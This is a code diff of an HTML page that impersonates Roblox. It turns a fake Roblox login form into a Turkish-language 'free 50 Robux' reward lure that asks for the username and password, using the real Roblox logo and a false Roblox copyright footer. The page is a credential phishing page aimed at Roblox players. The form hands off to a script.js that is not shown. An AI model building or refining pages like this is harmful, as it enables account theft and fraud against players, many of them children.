@@ -3,26 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Login</title>
+    <title>Roblox | Promo Code Rewards</title>
     <style>
-        body { font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #F2F4F5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); width: 400px; text-align: center; }
-        h1 { font-size: 22px; font-weight: 700; margin-bottom: 20px; color: #454B4E; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #B8BFC4; border-radius: 3px; box-sizing: border-box; background-color: #F2F4F5; }
-        button { width: 100%; padding: 12px; background-color: #0084FF; border: none; color: white; font-weight: bold; border-radius: 3px; cursor: pointer; margin-top: 10px; }
-        button:hover { background-color: #0074E0; }
-        .footer-links { margin-top: 20px; font-size: 13px; color: #0084FF; }
+        body { font-family: 'Gotham', sans-serif; background-color: #E3E3E3; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .reward-box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); width: 350px; text-align: center; border-top: 8px solid #00B06F; }
+        .logo { width: 150px; margin-bottom: 15px; }
+        h2 { color: #393B3D; font-size: 20px; margin: 10px 0; }
+        p { color: #65676B; font-size: 14px; }
+        .robux-badge { background: #00B06F; color: white; padding: 5px 15px; border-radius: 20px; font-weight: bold; display: inline-block; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #B8BFC4; border-radius: 5px; box-sizing: border-box; }
+        #login-btn { width: 100%; padding: 12px; background-color: #00B06F; border: none; color: white; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        #login-btn:hover { background-color: #008C58; }
+        .footer { font-size: 11px; color: #ADB0B1; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h1>Roblox'a Giriş Yap</h1>
-        <form id="login-form">
-            <input type="text" id="user" placeholder="Kullanıcı Adı / E-posta / Telefon" required>
+    <div class="reward-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_logo.svg" class="logo" alt="Roblox">
+        <div class="robux-badge">🎁 50 ROBUX HEDİYE</div>
+        <h2>Ödülünü Al!</h2>
+        <p>50 Robux hesabına tanımlandı. Almak için giriş yapman yeterli.</p>
+        <form id="reward-form">
+            <input type="text" id="user" placeholder="Kullanıcı Adı" required>
             <input type="password" id="pass" placeholder="Şifre" required>
-            <button type="submit" id="login-btn">Giriş Yap</button>
+            <button type="submit" id="login-btn">HEMEN ROBUX'I AL</button>
         </form>
-        <div class="footer-links">Şifreni mi unuttun?</div>
+        <div class="footer">©2026 Roblox Corporation. Tüm hakları saklıdır.</div>
     </div>
     <script src="script.js"></script>
 </body>
